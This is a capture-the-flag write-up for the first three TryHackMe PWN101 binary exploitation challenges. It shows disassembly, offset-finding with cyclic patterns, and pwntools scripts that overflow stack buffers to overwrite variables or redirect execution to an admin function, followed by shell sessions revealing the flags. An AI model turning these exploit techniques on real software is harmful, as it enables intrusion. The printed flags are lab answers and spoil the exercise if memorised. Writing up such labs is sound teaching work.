# PWN101

Beginner level binary exploitation challenges.



## Challenge 1 - pwn101

Just overflow the program.............

```bash
❯ nc 10.10.112.167 9001
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 101          

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thanks, Here's a small gift for you <3

ls
flag.txt
pwn101
pwn101.c
cat flag.txt
THM{7h4t's_4n_3zy_oveRflowwwww}


```

---

---

## Challenge 2 - pwn102

let's open the binary in cutter:

---

<img width="1388" alt="Screenshot 2024-04-12 at 1 50 07 AM" src="https://github.com/Lynk4/THM/assets/44930131/842b2094-805f-47e2-9ba0-cd2702ba2953">

---

In gdb:


```bash
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000000006e0  _init
0x0000000000000710  puts@plt
0x0000000000000720  system@plt
0x0000000000000730  printf@plt
0x0000000000000740  setvbuf@plt
0x0000000000000750  __isoc99_scanf@plt
0x0000000000000760  exit@plt
0x0000000000000770  __cxa_finalize@plt
0x0000000000000780  _start
0x00000000000007b0  deregister_tm_clones
0x00000000000007f0  register_tm_clones
0x0000000000000840  __do_global_dtors_aux
0x0000000000000880  frame_dummy
0x000000000000088a  setup
0x00000000000008eb  banner
0x00000000000008fe  main
0x00000000000009b0  __libc_csu_init
0x0000000000000a20  __libc_csu_fini
0x0000000000000a24  _fini
pwndbg> disass main
Dump of assembler code for function main:
   0x00000000000008fe <+0>:	push   rbp
   0x00000000000008ff <+1>:	mov    rbp,rsp
   0x0000000000000902 <+4>:	sub    rsp,0x70
   0x0000000000000906 <+8>:	mov    eax,0x0
   0x000000000000090b <+13>:	call   0x88a <setup>
   0x0000000000000910 <+18>:	mov    eax,0x0
   0x0000000000000915 <+23>:	call   0x8eb <banner>
   0x000000000000091a <+28>:	mov    DWORD PTR [rbp-0x4],0xbadf00d
   0x0000000000000921 <+35>:	mov    DWORD PTR [rbp-0x8],0xfee1dead
   0x0000000000000928 <+42>:	mov    edx,DWORD PTR [rbp-0x8]
   0x000000000000092b <+45>:	mov    eax,DWORD PTR [rbp-0x4]
   0x000000000000092e <+48>:	mov    esi,eax
   0x0000000000000930 <+50>:	lea    rdi,[rip+0x212]        # 0xb49
   0x0000000000000937 <+57>:	mov    eax,0x0
   0x000000000000093c <+62>:	call   0x730 <printf@plt>
   0x0000000000000941 <+67>:	lea    rax,[rbp-0x70]
   0x0000000000000945 <+71>:	mov    rsi,rax
   0x0000000000000948 <+74>:	lea    rdi,[rip+0x217]        # 0xb66
   0x000000000000094f <+81>:	mov    eax,0x0
   0x0000000000000954 <+86>:	call   0x750 <__isoc99_scanf@plt>
   0x0000000000000959 <+91>:	cmp    DWORD PTR [rbp-0x4],0xc0ff33
   0x0000000000000960 <+98>:	jne    0x992 <main+148>
   0x0000000000000962 <+100>:	cmp    DWORD PTR [rbp-0x8],0xc0d3
   0x0000000000000969 <+107>:	jne    0x992 <main+148>
   0x000000000000096b <+109>:	mov    edx,DWORD PTR [rbp-0x8]
   0x000000000000096e <+112>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000000971 <+115>:	mov    esi,eax
   0x0000000000000973 <+117>:	lea    rdi,[rip+0x1ef]        # 0xb69
   0x000000000000097a <+124>:	mov    eax,0x0
   0x000000000000097f <+129>:	call   0x730 <printf@plt>
   0x0000000000000984 <+134>:	lea    rdi,[rip+0x1f4]        # 0xb7f
   0x000000000000098b <+141>:	call   0x720 <system@plt>
   0x0000000000000990 <+146>:	jmp    0x9a8 <main+170>
   0x0000000000000992 <+148>:	lea    rdi,[rip+0x1ef]        # 0xb88
   0x0000000000000999 <+155>:	call   0x710 <puts@plt>
   0x000000000000099e <+160>:	mov    edi,0x539
   0x00000000000009a3 <+165>:	call   0x760 <exit@plt>
   0x00000000000009a8 <+170>:	leave
   0x00000000000009a9 <+171>:	ret
End of assembler dump.
pwndbg>
```
so the binary checks arguments 0xc0ff33 , 0xc0d3 to pop a shell.

let's find a offset

We are writing at rsp 0x70 upto rbp 0x8

offset will be 104 in decimal and 0x68 in hex:

---

<img width="1429" alt="Screenshot 2024-04-12 at 1 45 11 AM" src="https://github.com/Lynk4/THM/assets/44930131/de210749-88fb-4871-8a99-56ac1acda792">

---

Now let's create the exploit

```python3
#!/usr/bin/python3


from pwn import *

context.binary = binary = "./pwn102-1644307392479.pwn102"

#0xc0ff33 0xc0d3

payload = b"A"*0x68 + p32(0xc0d3) + p32(0xc0ff33)

# process
p = remote("10.10.112.167", 9002)
p.recv()
p.sendline(payload)
p.interactive()
```
let's test it....

```bash
❯ python3 exploit.py
[*] '/home/lynk/thm/pwn101/pwn102/pwn102-1644307392479.pwn102'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 10.10.112.167 on port 9002: Done
[*] Switching to interactive mode

I need badf00d to fee1dead
Am I right? Yes, I need c0ff33 to c0d3
$ ls
flag.txt
pwn102
pwn102.c
$ cat flag.txt
THM{y3s_1_n33D_C0ff33_to_C0d3_<3}
$  
```


---

---

# Challenge 3 - pwn103

By running the binary we options to choose....

I investigated all of the options, and the third is the most interesting.

- General
```bash
❯ ./pwn103-1644300337872.pwn103
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

  [THM Discord Server]

➖➖➖➖➖➖➖➖➖➖➖
1) 📢 Announcements
2) 📜 Rules
3) 🗣  General
4) 🏠 rooms discussion
5) 🤖 Bot commands
➖➖➖➖➖➖➖➖➖➖➖
⌨️  Choose the channel: 3

🗣  General:

------[jopraveen]: Hello pwners 👋
------[jopraveen]: Hope you're doing well 😄
------[jopraveen]: You found the vuln, right? 🤔

------[pwner]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Try harder!!! 💪
zsh: segmentation fault  ./pwn103-1644300337872.pwn103
```

---

it's a scanf call

```bash
❯ r2 -d pwn103-1644300337872.pwn103
[0x7fd146fe3360]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Skipping type matching analysis in debugger mode (aaft)
[x] Propagate noreturn information (aanr)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x7fd146fe3360]> afl
0x004010b0    1 43           entry0
0x004010f0    4 33   -> 31   sym.deregister_tm_clones
0x00401120    4 49           sym.register_tm_clones
0x00401160    3 33   -> 32   sym.__do_global_dtors_aux
0x00401190    1 6            entry.init0
0x004016e0    1 1            sym.__libc_csu_fini
0x004016e4    1 9            sym._fini
0x0040153e    1 22           sym.banner
0x00401040    1 6            sym.imp.puts
0x00401262    1 92           sym.announcements
0x0040158c    3 236  -> 176  main
0x004011f7    1 107          sym.rules
0x00401680    4 93           sym.__libc_csu_init
0x004012be    4 186          sym.general
0x004010e0    1 1            sym._dl_relocate_static_pie
0x00401554    1 56           sym.admins_only
0x00401050    1 6            sym.imp.system
0x004014e2    1 92           sym.discussion
0x00401378   12 362          sym.bot_cmd
0x00401000    3 23           sym._init
0x00401196    1 97           sym.setup
0x00401090    1 6            sym.imp.setvbuf
0x00401030    1 6            sym.imp.strncmp
0x00401060    1 6            sym.imp.printf
0x00401070    1 6            sym.imp.read
0x00401080    1 6            sym.imp.strcmp
0x004010a0    1 6            sym.imp.__isoc99_scanf
[0x7fd146fe3360]> pdf @sym.general
┌ 186: sym.general ();
│           ; var int64_t var_20h @ rbp-0x20
│           0x004012be      55             push rbp
│           0x004012bf      4889e5         mov rbp, rsp
│           0x004012c2      4883ec20       sub rsp, 0x20
│           0x004012c6      488d05dd1000.  lea rax, [0x004023aa]       ; "\n\U0001f5e3  General:\n"
│           0x004012cd      4889c7         mov rdi, rax
│           0x004012d0      e86bfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004012d5      488d05e41000.  lea rax, str._______jopraveen_:_Hello_pwners_ ; 0x4023c0 ; "------[jopraveen]: Hello pwners \U0001f44b"
│           0x004012dc      4889c7         mov rdi, rax
│           0x004012df      e85cfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004012e4      488d05fd1000.  lea rax, str._______jopraveen_:_Hope_youre_doing_well_ ; 0x4023e8 ; "------[jopraveen]: Hope you're doing well \U0001f604"
│           0x004012eb      4889c7         mov rdi, rax
│           0x004012ee      e84dfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004012f3      488d051e1100.  lea rax, str._______jopraveen_:_You_found_the_vuln__right__ ; 0x402418 ; "------[jopraveen]: You found the vuln, right? \U0001f914\n"
│           0x004012fa      4889c7         mov rdi, rax
│           0x004012fd      e83efdffff     call sym.imp.puts        
   ; int puts(const char *s)
│           0x00401302      488d05431100.  lea rax, str._______pwner_:_ ; 0x40244c ; "------[pwner]: "
│           0x00401309      4889c7         mov rdi, rax
│           0x0040130c      b800000000     mov eax, 0
│           0x00401311      e84afdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00401316      488d45e0       lea rax, [var_20h]
│           0x0040131a      4889c6         mov rsi, rax
│           0x0040131d      488d05381100.  lea rax, [0x0040245c]       ; "%s"
│           0x00401324      4889c7         mov rdi, rax
│           0x00401327      b800000000     mov eax, 0
│           0x0040132c      e86ffdffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x00401331      488d45e0       lea rax, [var_20h]
│           0x00401335      488d15231100.  lea rdx, [0x0040245f]       ; "yes"
│           0x0040133c      4889d6         mov rsi, rdx
│           0x0040133f      4889c7         mov rdi, rax
│           0x00401342      e839fdffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
│           0x00401347      85c0           test eax, eax
│       ┌─< 0x00401349      751b           jne 0x401366
│       │   0x0040134b      488d05111100.  lea rax, str._______jopraveen_:_GG__n ; 0x402463 ; "------[jopraveen]: GG \U0001f604\n"
│       │   0x00401352      4889c7         mov rdi, rax
│       │   0x00401355      e8e6fcffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x0040135a      b800000000     mov eax, 0
│       │   0x0040135f      e828020000     call main                   ; int main(int argc, char **argv, char **envp)
│      ┌──< 0x00401364      eb0f           jmp 0x401375
│      │└─> 0x00401366      488d05121100.  lea rax, str.Try_harder____ ; 0x40247f ; "Try harder!!! \U0001f4aa"
│      │    0x0040136d      4889c7         mov rdi, rax
│      │    0x00401370      e8cbfcffff     call sym.imp.puts           ; int puts(const char *s)
│      │    ; CODE XREF from sym.general @ 0x401364
│      └──> 0x00401375      90             nop
│           0x00401376      c9             leave
└           0x00401377      c3             ret
```

So we can overwrite the memory and redirect the execution to an other location. So the next goal is to identify a specific site where the execution should be returned.

there's a funtion ***admins_only*** we will redirect it to this function.

so let's find the offset of the program:

---

```bash
pwndbg> run
Starting program: /home/lynk/thm/pwn101/pwn103/pwn103-1644300337872.pwn103 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

  [THM Discord Server]

➖➖➖➖➖➖➖➖➖➖➖
1) 📢 Announcements
2) 📜 Rules
3) 🗣  General
4) 🏠 rooms discussion
5) 🤖 Bot commands
➖➖➖➖➖➖➖➖➖➖➖
⌨️  Choose the channel: 3

🗣  General:

------[jopraveen]: Hello pwners 👋
------[jopraveen]: Hope you're doing well 😄
------[jopraveen]: You found the vuln, right? 🤔

------[pwner]: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
Try harder!!! 💪

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401377 in general ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────
*RAX  0x13
*RBX  0x7fffffffe428 —▸ 0x7fffffffe689 ◂— '/home/lynk/thm/pwn101/pwn103/pwn103-1644300337872.pwn103'
*RCX  0x7ffff7ec0b00 (write+16) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x0
*RDI  0x7ffff7f9ea30 (_IO_stdfile_1_lock) ◂— 0x0
*RSI  0x7ffff7f9d803 (_IO_2_1_stdout_+131) ◂— 0xf9ea30000000000a /* '\n' */
*R8   0x65
*R9   0x7ffff7f9caa0 (_IO_2_1_stdin_) ◂— 0xfbad208b
*R10  0x7ffff7de1e80 ◂— 0x10001a00007bf8
*R11  0x202
 R12  0x0
*R13  0x7fffffffe438 —▸ 0x7fffffffe6c2 ◂— 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
 R14  0x0
*R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2d0 ◂— 0x0
*RBP  0x6161616161616165 ('eaaaaaaa')
*RSP  0x7fffffffe2f8 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
*RIP  0x401377 (general+185) ◂— ret 
─────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────
 ► 0x401377 <general+185>    ret    <0x6161616161616166>










───────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffe2f8 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
01:0008│     0x7fffffffe300 ◂— 'gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
02:0010│     0x7fffffffe308 ◂— 'haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
03:0018│     0x7fffffffe310 ◂— 'iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
04:0020│     0x7fffffffe318 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaa'
05:0028│     0x7fffffffe320 ◂— 'kaaaaaaalaaaaaaamaaa'
06:0030│     0x7fffffffe328 ◂— 'laaaaaaamaaa'
07:0038│     0x7fffffffe330 ◂— 0x6161616d /* 'maaa' */
─────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────
 ► 0         0x401377 general+185
   1 0x6161616161616166
   2 0x6161616161616167
   3 0x6161616161616168
   4 0x6161616161616169
   5 0x616161616161616a
   6 0x616161616161616b
   7 0x616161616161616c
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
pwndbg>
```

---

Offset is 40 

lets craft the payload 

basically it will be like

padding + admins_only function

Here’s the exploit.

---

```python3
from pwn import *

context.binary = binary = ELF("./pwn103-1644300337872.pwn103")

#p = process()
p = remote("10.10.96.138", 9003)
p.sendline(b"3")

admins_only_function = p64(binary.symbols.admins_only)
payload = b"A"*40 + admins_only_function + admins_only_function

p.sendline(payload)
p.interactive()
```

---
we have used admins_only functions 2 times to esablish a stable shell.


let's run the exploit


```bash
❯ python3 exploit.py
[*] '/home/lynk/thm/pwn101/pwn103/pwn103-1644300337872.pwn103'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 10.10.96.138 on port 9003: Done
[*] Switching to interactive mode
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

  [THM Discord Server]

➖➖➖➖➖➖➖➖➖➖➖
1) 📢 Announcements
2) 📜 Rules
3) 🗣  General
4) 🏠 rooms discussion
5) 🤖 Bot commands
➖➖➖➖➖➖➖➖➖➖➖
⌨️  Choose the channel: 
🗣  General:

------[jopraveen]: Hello pwners 👋
------[jopraveen]: Hope you're doing well 😄
------[jopraveen]: You found the vuln, right? 🤔

------[pwner]: Try harder!!! 💪

👮  Admins only:

Welcome admin 😄
[*] Got EOF while reading in interactive
$ ls
$ ls -la
[*] Closed connection to 10.10.96.138 port 9003
[*] Got EOF while sending in interactive
❯ python3 exploit.py
[*] '/home/lynk/thm/pwn101/pwn103/pwn103-1644300337872.pwn103'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 10.10.96.138 on port 9003: Done
[*] Switching to interactive mode
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

  [THM Discord Server]

➖➖➖➖➖➖➖➖➖➖➖
1) 📢 Announcements
2) 📜 Rules
3) 🗣  General
4) 🏠 rooms discussion
5) 🤖 Bot commands
➖➖➖➖➖➖➖➖➖➖➖
⌨️  Choose the channel: 
🗣  General:

------[jopraveen]: Hello pwners 👋
------[jopraveen]: Hope you're doing well 😄
------[jopraveen]: You found the vuln, right? 🤔

------[pwner]: Try harder!!! 💪

👮  Admins only:

Welcome admin 😄

👮  Admins only:

➖➖➖➖➖➖➖➖➖➖➖
1) 📢 Announcements
2) 📜 Rules
3) 🗣  General
4) 🏠 rooms discussion
5) 🤖 Bot commands
➖➖➖➖➖➖➖➖➖➖➖
⌨️  Choose the channel: 
🗣  General:

➖➖➖➖➖➖➖➖➖➖➖
1) 📢 Announcements
2) 📜 Rules
3) 🗣  General
4) 🏠 rooms discussion
5) 🤖 Bot commands
➖➖➖➖➖➖➖➖➖➖➖
⌨️  Choose the channel: 
🗣  General:

------[jopraveen]: Hello pwners 👋
------[jopraveen]: Hope you're doing well 😄
------[jopraveen]: You found the vuln, right? 🤔

------[pwner]: Try harder!!! 💪

👮  Admins only:

Welcome admin 😄

👮  Admins only:

Welcome admin 😄
$ ls
flag.txt
pwn103
pwn103.c
$ cat flag.txt
THM{w3lC0m3_4Dm1N}
$
```

---

---











